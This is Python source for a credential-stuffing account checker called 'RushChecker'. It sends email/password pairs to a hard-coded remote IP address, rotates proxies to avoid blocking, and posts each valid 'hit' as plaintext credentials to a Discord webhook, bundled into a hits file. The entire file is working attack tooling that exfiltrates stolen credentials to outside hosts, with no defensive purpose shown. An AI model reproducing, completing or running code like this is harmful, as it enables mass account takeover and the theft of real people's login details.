import requests
import zipfile
import io
from datetime import datetime
from utils.webhook import DiscordWebhook
from utils.proxy_manager import ProxyManager
from utils.rate_limiter import RateLimiter
from utils.logger import Logger

class RushChecker:
    def __init__(self, config):
        self.config = config
        self.webhook = DiscordWebhook(config.get('webhook_url'))
        self.proxy_manager = ProxyManager()
        self.rate_limiter = RateLimiter(config.get('threads'))
        self.logger = Logger()
        self.hits = []
        self.fails = 0
        self.retries = 0
        self.checked = 0

    def clark(self, email, password):
        json_data = {
            "email": email,
            "pass": password
        }
        
        proxy = self.proxy_manager.get_next_proxy() if self.config.get('proxy_rotation') else None
        
        try:
            response = requests.post(
                "http://134.255.218.89:6969/check", 
                json=json_data,
                proxies=proxy,
                timeout=self.config.get('timeout')
            )
            return response.text
        except Exception as e:
            self.logger.log(f"Error checking {email}: {str(e)}", "ERROR")
            return None

    async def check_account(self, email, password):
        await self.rate_limiter.wait()
        
        response = self.clark(email, password)
        if response and "success" in response.lower():
            hit_data = {
                'email': email,
                'password': password,
                'response': response,
                'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            self.hits.append(hit_data)
            await self.send_hit_to_discord(hit_data)
            self.logger.log(f"Hit found: {email}", "SUCCESS")
        
        self.checked += 1

    async def send_hit_to_discord(self, hit_data):
        embed = {
            "title": "🎯 New Hit Found!",
            "color": 0x00ff00,
            "fields": [
                {"name": "Email", "value": f"`{hit_data['email']}`", "inline": True},
                {"name": "Password", "value": f"`{hit_data['password']}`", "inline": True},
                {"name": "Response", "value": f"```{hit_data['response']}```", "inline": False}
            ],
            "footer": {"text": f"Rush Checker • {hit_data['timestamp']}"}
        }

        hits_content = '\n'.join([f"{h['email']}:{h['password']} | {h['response']}" for h in self.hits])
        
        if len(hits_content) > 7500:
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                zip_file.writestr('hits.txt', hits_content)
            
            zip_buffer.seek(0)
            await self.webhook.send_file(
                embeds=[embed],
                file=zip_buffer,
                filename='hits.zip'
            )
        else:
            hits_buffer = io.StringIO(hits_content)
            await self.webhook.send_file(
                embeds=[embed],
                file=hits_buffer,
                filename='hits.txt'
            )
